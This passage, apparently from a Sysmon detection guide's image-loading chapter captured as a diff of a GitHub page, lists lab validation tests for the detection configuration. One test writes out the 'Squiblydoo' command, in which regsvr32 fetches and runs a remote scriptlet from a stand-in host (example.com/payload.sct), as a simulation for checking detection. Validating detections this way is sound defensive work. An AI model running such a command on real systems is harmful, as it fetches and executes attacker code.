+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Testing and Validation</h2><a id="user-content-testing-and-validation" class="anchor" aria-label="Permalink: Testing and Validation" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#testing-and-validation"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Validate your image loading configuration captures attacks without overwhelming your systems:</p>
+<ol dir="auto">
+<li><strong>Test Script-Based Attacks</strong>: Execute a malicious macro in a lab to verify detection of vbscript.dll loading</li>
+<li><strong>PowerShell Detection</strong>: Test PowerShell execution from unusual processes</li>
+<li><strong>Squiblydoo Simulation</strong>: Test regsvr32 /u /s /i:<a href="http://example.com/payload.sct" rel="nofollow">http://example.com/payload.sct</a> scrobj.dll technique</li>
+<li><strong>Monitor Volume</strong>: Track image load event volume daily to ensure it remains manageable (typically &lt;1000 events/day/host for well-configured systems)</li>
+<li><strong>CPU Impact</strong>: Monitor Sysmon CPU usage to ensure image loading is not causing performance issues</li>
+</ol>
+<p dir="auto">Image loading monitoring, when properly configured with targeted includes, provides valuable detection of sophisticated attack techniques like DLL injection, script engine abuse, and process injection. The key is maintaining strict discipline about only monitoring high-value indicators to keep volume and performance impact manageable.</p>
+</article></div><button data-hotkey="Control+a"></button></section></div></div></div> </div> <!-- --> </div></div></div></div></div></div><div class="ScrollMarksContainer-module__scrollMarksContainer__Eu7uU" id="find-result-marks-container"></div><button data-testid="" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="Control+F6,Control+Shift+F6"></button><button data-hotkey="Control+F6,Control+Shift+F6"></button></div> <!-- --> <!-- --> </div>
+</react-app>
+
+
+
+
+  </div>
+
+</turbo-frame>
+
+    </main>
+  </div>
+
+  </div>
+
+          
+
+
+
+    <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999" data-locale="en" data-initial-cookie-consent-allowed="" data-cookie-consent-required="false" data-catalyst=""></ghcc-consent>
+
+
+
+
+  <div id="ajax-error-message" class="ajax-error-message flash flash-error">
+    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+    </button>
+    You can’t perform that action at this time.
+  </div>
+
+    
+  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open="">
+    <summary role="button" aria-label="Close dialog"></summary>
+    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
+      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog="">
+        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+      </button>
+      <div class="octocat-spinner tmp-my-6 js-details-dialog-spinner"></div>
+    </details-dialog>
+  </details>
+
+
+    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
+  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;"></div>
+</div>
+
+    
+  <div class="zeroclipboard-container position-absolute right-0 top-0">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0" data-copy-feedback="Copied!" data-tooltip-direction="w">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div>
+
+
+  <div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div>
+
+
+
+
+
+    </div>
+    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true"></div>
+    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
+  
+
+
+<div class="sr-only mt-n1" id="screenReaderAnnouncementDiv" role="alert" data-testid="screenReaderAnnouncement" aria-live="assertive"></div></body></html>
